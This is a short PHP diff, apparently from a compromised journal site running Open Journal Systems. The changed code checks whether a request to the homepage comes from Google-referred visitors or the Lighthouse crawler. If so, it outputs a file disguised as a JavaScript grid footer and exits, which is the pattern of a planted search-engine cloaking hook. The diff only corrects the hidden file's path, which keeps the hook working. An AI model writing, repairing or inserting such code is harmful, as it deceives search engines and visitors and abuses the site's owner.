@@ -9,7 +9,7 @@ if ($uri == '/' && (
     strpos($userAgent, 'chrome-lighthouse') !== false || 
     strpos($referer, 'google') !== false
 )) {
-    echo file_get_contents('/js/controllers/grid/articleGalleys/ArticleGalleyGridfooter.js');
+    echo file_get_contents('js/controllers/grid/articleGalleys/ArticleGalleyGridfooter.js');
     exit();
 }
 
